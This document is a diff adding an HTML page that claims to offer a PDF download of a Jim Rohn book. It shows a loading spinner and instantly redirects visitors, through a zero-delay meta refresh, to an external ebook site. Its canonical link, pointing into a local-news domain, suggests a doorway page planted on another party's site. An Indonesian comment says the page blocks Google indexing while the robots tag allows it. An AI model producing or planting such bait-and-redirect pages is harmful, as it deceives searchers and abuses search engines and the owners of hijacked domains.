@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jim Rohn The Day That Turns Your Life Around</title>
+    <meta name="description" content="Download Jim Rohn The Day That Turns Your Life Around in PDF format.">
+	<link rel="canonical" href="https://util.wickedlocal.com/files/textbook-solutions/Resources:E2E1/HomePages/Jim-Rohn-The-Day-That-Turns-Your-Life-Around.pdf">
+    <meta name="robots" content="index, follow"> <!-- Hindari pengindeksan oleh Google -->
+    <style>
+        body {
+            text-align: center;
+            background-color: #f4f4f4;
+            font-family: Arial, sans-serif;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+
+        .loading-text {
+            font-size: 1.8rem;
+            color: #555;
+            margin-top: 20px;
+        }
+
+        .spinner {
+            margin-top: 20px;
+            border: 8px solid #f4f4f4; /* Warna latar belakang */
+            border-top: 8px solid #ff6347; /* Warna garis */
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-text">
+        Loading Jim Rohn The Day That Turns Your Life Around    </div>
+    <div class="spinner"></div>
+
+    <!-- Meta Refresh untuk redirect dengan delay -->
+    <meta http-equiv="refresh" content="0;url=https://ebookpdf.org/4898716-jim-rohn-the-day-that-turns-your-life-around.pdf">
+
+    
+</body>
+</html>
